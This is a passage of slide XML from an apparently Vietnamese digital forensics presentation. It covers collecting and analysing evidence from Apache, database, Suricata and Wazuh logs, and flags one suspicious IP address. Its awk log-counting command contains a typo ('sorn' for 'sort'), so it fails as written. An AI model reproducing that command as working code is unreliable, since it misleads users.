          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="909263" y="1824037"/>
            <a:ext cx="381000" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="414" name="Google Shape;414;p39"/>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6.2. Thu thập và bảo toàn chứng cứ: </a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="415" name="Google Shape;415;p39"/>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16" name="Google Shape;416;p39"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1104900" y="2728274"/>
            <a:ext cx="4738300" cy="3320225"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="417" name="Google Shape;417;p39"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6183500" y="2728276"/>
            <a:ext cx="4617850" cy="33202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421"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="422" name="Google Shape;422;p40" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="975800" y="1507550"/>
            <a:ext cx="9892300" cy="4896825"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="423" name="Google Shape;423;p40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1801400" y="1827575"/>
            <a:ext cx="25293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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Web Server:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="424" name="Google Shape;424;p40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1783600" y="2276563"/>
            <a:ext cx="8276700" cy="905100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="160000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="CBD5E1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Apache log:  access.log,  error.log, auth.log,...</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="CBD5E1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="160000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="CBD5E1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Database: query.log</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="CBD5E1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="160000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="CBD5E1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>attack.pcap</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="CBD5E1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="425" name="Google Shape;425;p40" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1253725" y="1798625"/>
            <a:ext cx="333375" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="426" name="Google Shape;426;p40"/>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6.3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Phân tích Chứng cứ: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="427" name="Google Shape;427;p40"/>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8" name="Google Shape;428;p40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1801400" y="3652250"/>
            <a:ext cx="25293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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>IDS Suricata:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="429" name="Google Shape;429;p40" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1253725" y="3623300"/>
            <a:ext cx="333375" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="430" name="Google Shape;430;p40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1801400" y="4993975"/>
            <a:ext cx="25293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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Wazuh:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="431" name="Google Shape;431;p40" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1253725" y="4965025"/>
            <a:ext cx="333375" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="432" name="Google Shape;432;p40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1862000" y="4032113"/>
            <a:ext cx="8276700" cy="905100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="160000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="CBD5E1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>eve.json:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="CBD5E1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="160000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>+ alerts.json</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="CBD5E1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="160000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>+ http.json</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="CBD5E1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="433" name="Google Shape;433;p40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1862000" y="5571200"/>
            <a:ext cx="8276700" cy="215400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="160000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="CBD5E1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>archives.json</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="CBD5E1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="434" name="Google Shape;434;p40"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8118415" y="3503312"/>
            <a:ext cx="1746084" cy="1370676"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="435" name="Google Shape;435;p40"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7922627" y="1973393"/>
            <a:ext cx="2137677" cy="1424756"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="436" name="Google Shape;436;p40"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8485875" y="5096475"/>
            <a:ext cx="1164850" cy="11648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440"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="441" name="Google Shape;441;p41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="785025" y="1975275"/>
            <a:ext cx="10622100" cy="840600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="355600" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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 Dùng lệnh awk để trích xuất địa chỉ IP:</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="355600" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>awk '{print $1}' access.log | sort | uniq -c | sorn -nr </a:t>
            </a:r>
            <a:endParaRPr sz="1150" i="1">
              <a:solidFill>
                <a:srgbClr val="64748B"/>
              </a:solidFill>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="149955"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150" i="1">
              <a:solidFill>
                <a:srgbClr val="64748B"/>
              </a:solidFill>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="442" name="Google Shape;442;p41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800" y="5110500"/>
            <a:ext cx="10622100" cy="712500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="355600" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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 Kết quả cho thấy IP 192.158.221.143 xuất hiện nhiều lần (15 lần), là nguồn thực hiện các request =&gt; Đây là IP cần đưa vào diện nghi vấn.</a:t>
            </a:r>
            <a:endParaRPr sz="1150" i="1">
              <a:solidFill>
                <a:srgbClr val="64748B"/>
              </a:solidFill>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="149955"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150" i="1">
              <a:solidFill>
                <a:srgbClr val="64748B"/>
              </a:solidFill>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="443" name="Google Shape;443;p41"/>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3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>6.3.1. Chi tiết - Phân tích Web Log (access.log + error.log): </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="444" name="Google Shape;444;p41"/>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45" name="Google Shape;445;p41" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect r="99349"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="749746" y="4676475"/>
            <a:ext cx="119825" cy="1580550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="446" name="Google Shape;446;p41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1328775"/>
            <a:ext cx="4400700" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Xác định nguồn gốc: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="447" name="Google Shape;447;p41" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
